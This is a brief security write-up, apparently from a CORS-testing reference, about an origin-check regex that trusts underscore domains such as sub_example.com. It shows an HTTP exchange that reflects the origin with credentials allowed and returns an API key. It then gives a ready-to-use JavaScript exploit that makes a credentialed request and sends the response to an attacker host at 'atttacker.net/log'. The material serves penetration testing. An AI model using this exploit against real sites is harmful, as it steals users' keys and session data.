# Underscore Bypass

## Description 
The regex used for origin verification contains an underscore (`_`) character.

`wwww.example.com` trusts `www.sub_example.com`, which could be an attacker's domain.

**Severity**: High

## Exploit 
If the target is `sub.example.com`, make requests from `sub_example.com`.

### Example
**Vulnerable Implementation** 
```http
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://sub_example.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://sub_example.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

**Exploit**  
This exploit requires that the respective JS script is hosted at `sub_example.com`
```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```
